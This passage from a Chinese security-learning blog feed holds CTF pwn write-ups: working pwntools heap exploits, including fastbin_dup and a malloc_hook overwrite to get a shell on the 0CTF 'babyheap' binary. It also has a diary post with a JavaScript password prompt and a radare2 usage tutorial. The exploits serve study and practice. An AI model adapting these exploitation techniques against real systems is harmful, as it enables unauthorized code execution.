p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def search(s):</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.sendline(str(len(s)))</span><br><span class="line">    p.sendline(s)</span><br><span class="line"></span><br><span class="line">def make_cycle():</span><br><span class="line">    index_sentence(&apos;a&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;b&apos;*54 + &apos; d&apos;)</span><br><span class="line">    index_sentence(&apos;c&apos;*54 + &apos; d&apos;)</span><br><span class="line"></span><br><span class="line">    search(&apos;d&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    search(&apos;\x00&apos;)</span><br><span class="line">    p.sendline(&apos;y&apos;)</span><br><span class="line">    p.sendline(&apos;n&apos;)</span><br><span class="line"></span><br><span class="line">def make_fake_chunk(addr):</span><br><span class="line">    # set the fwd pointer of the chunk to the address we want</span><br><span class="line">    fake_chunk = p64(addr)</span><br><span class="line">    index_sentence(fake_chunk.ljust(56))</span><br><span class="line"></span><br><span class="line">def allocate_fake_chunk(binsh_addr, system_addr):</span><br><span class="line">    # allocate twice to get our fake chunk</span><br><span class="line">    index_sentence(&apos;A&apos;*56)</span><br><span class="line">    index_sentence(&apos;B&apos;*56)</span><br><span class="line"></span><br><span class="line">    # overwrite the return address</span><br><span class="line">    buf = &apos;A&apos;*30</span><br><span class="line">    buf += p64(pop_rdi_ret)</span><br><span class="line">    buf += p64(binsh_addr)</span><br><span class="line">    buf += p64(system_addr)</span><br><span class="line">    buf = buf.ljust(56, &apos;C&apos;)</span><br><span class="line"></span><br><span class="line">    index_sentence(buf)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    stack_leak = leak_stack()</span><br><span class="line"></span><br><span class="line">    # This makes stack_addr + 0x8 be 0x40  //在泄露的栈地址附近寻找0x40用于充当fakechunk的size</span><br><span class="line">    stack_addr = stack_leak + 0x5a - 8</span><br><span class="line"></span><br><span class="line">    log.info(&apos;stack leak: %s&apos; % hex(stack_leak))</span><br><span class="line">    log.info(&apos;stack addr: %s&apos; % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">    libc_leak = leak_libc()</span><br><span class="line">    libc_base = libc_leak - puts_offset</span><br><span class="line">    system_addr = libc_base + system_offset</span><br><span class="line">    binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">    log.info(&apos;libc leak: %s&apos; % hex(libc_leak))</span><br><span class="line">    log.info(&apos;libc_base: %s&apos; % hex(libc_base))</span><br><span class="line">    log.info(&apos;system addr: %s&apos; % hex(system_addr))</span><br><span class="line">    log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">    make_cycle()</span><br><span class="line">    make_fake_chunk(stack_addr)</span><br><span class="line">    allocate_fake_chunk(binsh_addr, system_addr)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h1 id="例题-0ctfbabyheap"><a href="#例题-0ctfbabyheap" class="headerlink" title="例题-0ctfbabyheap"></a>例题-0ctfbabyheap</h1><h2 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h2><p>炒鸡正规的条件选项题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">./0ctfbabyheap </span><br><span class="line">===== Baby Heap in 2017 =====</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br><span class="line">Command:</span><br></pre></td></tr></table></figure><p>分配的块可以分析出有一个结构体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">         struc_4  structure&#123; </span><br><span class="line">00000000 inuse          </span><br><span class="line">00000001 size         </span><br><span class="line">00000002 ptr           </span><br><span class="line">00000003 &#125;struc_4   ends</span><br></pre></td></tr></table></figure><p>inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址；</p><p>各个选项就不一一列举了，每个选项就如它名字一般：<br>allocate使用calloc分配块，最大4096；<br>fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；<br>free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。<br>dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。</p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><em>即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。</em></p><p>目标：1.leak libc地址<br>      2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx  (long long)(&amp;main_arena)-0x30</span><br><span class="line">0x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;:0x00007fa3a2004d600x0000000000000000</span><br><span class="line">0x7fa3a2008c20 &lt;__memalign_hook&gt;:0x00007fa3a1ed4bf00x00007fa3a1ed5160</span><br><span class="line">0x7fa3a2008c30 &lt;__malloc_hook&gt;:0x00000000000000000x0000000000000000  &lt;-- malloc hook </span><br><span class="line">0x7fa3a2008c40 &lt;main_arena&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c50 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c60 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c70 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c80 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008c90 &lt;main_arena+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fa3a2008ca0 &lt;main_arena+96&gt;:0x000055b8638813600x0000000000000000</span><br></pre></td></tr></table></figure><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./0ctfbabyheap&apos;)</span><br><span class="line">ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;</span><br><span class="line"></span><br><span class="line">def allocate(size):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def fill(index,content):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line">    sh.recvuntil(&apos;Size: &apos;)</span><br><span class="line">    sh.sendline(str(len(content)))</span><br><span class="line">    sh.recvuntil(&apos;Content: &apos;)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    sh.recvuntil(&apos;Command: &apos;)</span><br><span class="line">    sh.sendline(&quot;3&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def dump(index):</span><br><span class="line">    sh.recvuntil(&quot;Command: &quot;)</span><br><span class="line">    sh.sendline(&quot;4&quot;)</span><br><span class="line">    sh.recvuntil(&apos;Index: &apos;)</span><br><span class="line">    sh.sendline(str(index))</span><br><span class="line"></span><br><span class="line">#---------</span><br><span class="line"> </span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x80)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#----------leak libc base-----------</span><br><span class="line">free(2)</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">fill(0,&apos;a&apos;*0x10+p64(0)+p64(0x21)+p8(0x80))</span><br><span class="line">fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x21))</span><br><span class="line"></span><br><span class="line">allocate(0x10)</span><br><span class="line">allocate(0x10)</span><br><span class="line">fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x91))</span><br><span class="line">allocate(0x80)</span><br><span class="line"></span><br><span class="line">free(4)</span><br><span class="line">dump(2)</span><br><span class="line">sh.recvuntil(&apos;Content: \n&apos;)</span><br><span class="line">leak_addr = u64(sh.recv(8))</span><br><span class="line">main_arena = leak_addr - 88</span><br><span class="line">libc_base = main_arena - 0x3c4b20</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">print &apos;libc_base: &apos;+hex(libc_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#------------hjack malloc_hook --------</span><br><span class="line">one_gadget_off = 0x4526a</span><br><span class="line">one_gadget_addr = libc_base + one_gadget_off</span><br><span class="line">print &apos;one_gadget_addr: &apos;+hex(one_gadget_addr)</span><br><span class="line"></span><br><span class="line">allocate(0x60)</span><br><span class="line">free(4)</span><br><span class="line">fill(2,p64(main_arena - 0x33))</span><br><span class="line">allocate(0x60)</span><br><span class="line">allocate(0x60)</span><br><span class="line"></span><br><span class="line">fill(6,&apos;a&apos;*0x13+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">allocate(0x100)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>reference:<br><a href="https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1" target="_blank" rel="noopener">https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1</a><br><a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p><p><em>没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。</em></p>]]></content>
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Diary.20181008</title>
      <link href="/2018/10/08/diary-20181008/"/>
      <url>/2018/10/08/diary-20181008/</url>
      <content type="html"><![CDATA[<p>  下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；<br>nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；<br>黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；<br>配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。<br>周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh</p><p>…搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    (function()&#123;</span><br><span class="line">        if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123;</span><br><span class="line">            if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123;</span><br><span class="line">                alert(&apos;Wrong！&apos;);</span><br><span class="line">                history.back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。<br>这下好了，越来越糟糕</p><p>hexo-blog-encrypt 这个组件都不能用。。没办法了</p>]]></content>
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Radare2</title>
      <link href="/2018/09/25/radare2/"/>
      <url>/2018/09/25/radare2/</url>
      <content type="html"><![CDATA[<p><em>之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm</em></p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/radare/radare2.git</span><br><span class="line">$ cd radare2</span><br><span class="line">$ ./sys/install.sh</span><br></pre></td></tr></table></figure><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><em>之后学习使用中逐渐更新</em><br>常用包含工具：</p><ul><li>radare2-&gt;整合了所有工具</li><li>rabin2-&gt;查看文件格式的</li><li>radiff2-&gt;比较文件不同的</li><li>rahash2-&gt;各种密码算法，hash算法集成</li><li>rasm2-&gt;汇编和反汇编</li><li>ragg2-&gt;开发shellcode工具(radare2自己编写的编译器)</li></ul><h3 id="radare2"><a href="#radare2" class="headerlink" title="radare2"></a>radare2</h3><pre><code>随便加载个文件,会有一句欢迎语hhhh</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$r2 pwnme</span><br><span class="line"> -- We only have bugs, features are an unintended side-effect</span><br><span class="line">[0x08049090]&gt;                  //工具找到的入口位置</span><br></pre></td></tr></table></figure><h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><pre><code>查看文件基本信息</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># rabin2 -I pwnme</span><br><span class="line">arch     x86</span><br><span class="line">baddr    0x8048000</span><br><span class="line">binsz    14275</span><br><span class="line">bintype  elf</span><br><span class="line">bits     32</span><br><span class="line">canary   false</span><br><span class="line">sanitiz  false</span><br><span class="line">class    ELF32</span><br><span class="line">crypto   false</span><br><span class="line">endian   little</span><br><span class="line">havecode true</span><br><span class="line">intrp    /lib/ld-linux.so.2</span><br><span class="line">lang     c</span><br><span class="line">linenum  true</span><br><span class="line">lsyms    true</span><br><span class="line">machine  Intel 80386</span><br><span class="line">maxopsz  16</span><br><span class="line">minopsz  1</span><br><span class="line">nx       true</span><br><span class="line">os       linux</span><br><span class="line">pcalign  0</span><br><span class="line">pic      false</span><br><span class="line">relocs   true</span><br><span class="line">relro    partial</span><br><span class="line">rpath    NONE</span><br><span class="line">static   false</span><br><span class="line">stripped false</span><br><span class="line">subsys   linux</span><br><span class="line">va       true</span><br></pre></td></tr></table></figure><h3 id="rahash2"><a href="#rahash2" class="headerlink" title="rahash2"></a>rahash2</h3><pre><code>支持超多加解密</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"># rahash2 -L    //列举</span><br><span class="line">Available Hashes: </span><br><span class="line">h  md5</span><br><span class="line">h  sha1</span><br><span class="line">h  sha256</span><br><span class="line">h  sha384</span><br><span class="line">h  sha512</span><br><span class="line">h  md4</span><br><span class="line">h  xor</span><br><span class="line">h  xorpair</span><br><span class="line">h  parity</span><br><span class="line">h  entropy</span><br><span class="line">h  hamdist</span><br><span class="line">h  pcprint</span><br><span class="line">h  mod255</span><br><span class="line">h  xxhash</span><br><span class="line">h  adler32</span><br><span class="line">h  luhn</span><br><span class="line">h  crc8smbus</span><br><span class="line">h  crc15can</span><br><span class="line">h  crc16</span><br><span class="line">h  crc16hdlc</span><br><span class="line">h  crc16usb</span><br><span class="line">h  crc16citt</span><br><span class="line">h  crc24</span><br><span class="line">h  crc32</span><br><span class="line">h  crc32c</span><br><span class="line">h  crc32ecma267</span><br><span class="line">h  crc32bzip2</span><br><span class="line">h  crc32d</span><br><span class="line">h  crc32mpeg2</span><br><span class="line">h  crc32posix</span><br><span class="line">h  crc32q</span><br><span class="line">h  crc32jamcrc</span><br><span class="line">h  crc32xfer</span><br><span class="line">h  crc64</span><br><span class="line">h  crc64ecma</span><br><span class="line">h  crc64we</span><br><span class="line">h  crc64xz</span><br><span class="line">h  crc64iso</span><br><span class="line"></span><br><span class="line">Available Encoders/Decoders: </span><br><span class="line">e  base64</span><br><span class="line">e  base91</span><br><span class="line">e  punycode</span><br><span class="line"></span><br><span class="line">Available Crypto Algos: </span><br><span class="line">c  rc2</span><br><span class="line">c  rc4</span><br><span class="line">c  rc6</span><br><span class="line">c  aes-ecb</span><br><span class="line">c  aes-cbc</span><br><span class="line">c  ror</span><br><span class="line">c  rol</span><br><span class="line">c  rot</span><br><span class="line">c  blowfish</span><br><span class="line">c  cps2</span><br><span class="line">c  des-ecb</span><br><span class="line">c  xor</span><br><span class="line">c  serpent-ecb</span><br><span class="line"></span><br><span class="line"># rahash2 -a md5 ./pwnme       //生成md5哈希</span><br><span class="line">./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56</span><br></pre></td></tr></table></figure><h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><pre><code>支持汇编反汇编 </code></pre><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><pre><code>据说可以用来快速开发shellcode？</code></pre><h3 id="radiff2"><a href="#radiff2" class="headerlink" title="radiff2"></a>radiff2</h3><pre><code>支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。厂商更新漏洞时，可以寻找更新代码字段，说不定在那里还有希望挖到其他洞</code></pre><h3 id="rafind2"><a href="#rafind2" class="headerlink" title="rafind2"></a>rafind2</h3><pre><code>在文件中查找字节模式</code></pre><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><pre><code>用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和覆盖的默认文件描述符。rarun2可用于：* 破解小程序* 模糊测试* 测试组件</code></pre><h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><pre><code>用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示，十六进制字符串到ASCII之间进行基本转换，八进制到整数等。它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。</code></pre><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><ul><li>i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; ie</span><br><span class="line">[Entrypoints]</span><br><span class="line">vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program</span><br><span class="line"></span><br><span class="line">1 entrypoints</span><br><span class="line"></span><br><span class="line">[0x08049090]&gt; iz</span><br><span class="line">[Strings]</span><br><span class="line">Num Vaddr      Paddr      Len Size Section  Type  String</span><br><span class="line">000 0x00002008 0x0804a008   7   8 (.rodata) ascii /bin/sh</span><br><span class="line">001 0x00002010 0x0804a010   5   6 (.rodata) ascii input</span><br></pre></td></tr></table></figure><ul><li>a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme)</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># r2 -A pwnme</span><br><span class="line">[x] Analyze all flags starting with sym. and entry0 (aa)</span><br><span class="line">[x] Analyze function calls (aac)</span><br><span class="line">[x] Analyze len bytes of instructions for references (aar)</span><br><span class="line">[x] Constructing a function name for fcn.* and sym.func.* functions (aan)</span><br><span class="line">[x] Type matching analysis for all functions (afta)</span><br><span class="line">[x] Use -AA or aaaa to perform additional experimental analysis.</span><br><span class="line"> -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS</span><br></pre></td></tr></table></figure><ul><li>fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 <flag spaces="">，一个 flag 是所有类似特征的集合。可以使用 ‘fs <flagspaces>‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’).</flagspaces></flag></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[0x08049090]&gt; fs</span><br><span class="line">0    2 * strings</span><br><span class="line">1   37 * symbols</span><br><span class="line">2   30 * sections</span><br><span class="line">3   12 * segments</span><br><span class="line">4    5 * relocs</span><br><span class="line">5    5 * imports</span><br><span class="line">6    2 * functions</span><br><span class="line">[0x08049090]&gt; fs strings;f</span><br><span class="line">0x0804a008 8 str.bin_sh</span><br><span class="line">0x0804a010 6 str.input</span><br></pre></td></tr></table></figure><ul><li><p>axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。</p></li><li><p>vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。)</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-[ functions ]----------------- pdf ---</span><br><span class="line">(a) add     (x) xrefs  (q) quit  (jk) next/prev                         ;-- section..text:</span><br><span class="line">(r) rename  (c) calls  (g) go    (tab) column                           ;-- eip:</span><br><span class="line">(d) delete  (v) vars   (?) help  (:)  enter cmd             / (fcn) entry0 50</span><br><span class="line">&gt;* 0x08049090   50 entry0                                   |   entry0 ();</span><br><span class="line">   0x080490c3    4 fcn.080490c3                             |           0x08049090      xor ebp, ebp                               ; [14] -r-x secti</span><br><span class="line">   0x08049070    6 sym.imp.__libc_start_main                |           0x08049092      pop esi</span><br><span class="line">   0x080490f0   40 sym.deregister_tm_clones                 |           0x08049093      mov ecx, esp</span><br><span class="line">   0x08049130   53 sym.register_tm_clones                   |           0x08049095      and esp, 0xfffffff0</span><br><span class="line">   0x08049170   30 sym.__do_global_dtors_aux                |           0x08049098      push eax</span><br><span class="line">   0x080491a0    2 entry1.init                              |           0x08049099      push esp</span><br><span class="line">   0x080492b0    2 sym.__libc_csu_fini                      |           0x0804909a      push edx</span><br><span class="line">   0x080490e0    4 sym.__x86.get_pc_thunk.bx                |           0x0804909b      call fcn.080490c3</span><br><span class="line">   0x080492b4   20 sym._fini                                |           0x080490a0      add ebx, 0x2f60                            ; &apos;`/&apos;</span><br><span class="line">   0x08049250   93 sym.__libc_csu_init                      |           0x080490a6      lea eax, [ebx - 0x2d50]</span><br><span class="line">   0x080490d0    2 sym._dl_relocate_static_pie              |           0x080490ac      push eax                                   ; func fini</span><br><span class="line">   0x08049203   65 sym.main                                 |           0x080490ad      lea eax, [ebx - 0x2db0]</span><br><span class="line">   0x08049244    4 sym.__x86.get_pc_thunk.ax                |           0x080490b3      push eax                                   ; func init</span><br><span class="line">   0x08049050    6 sym.imp.puts                             |           0x080490b4      push 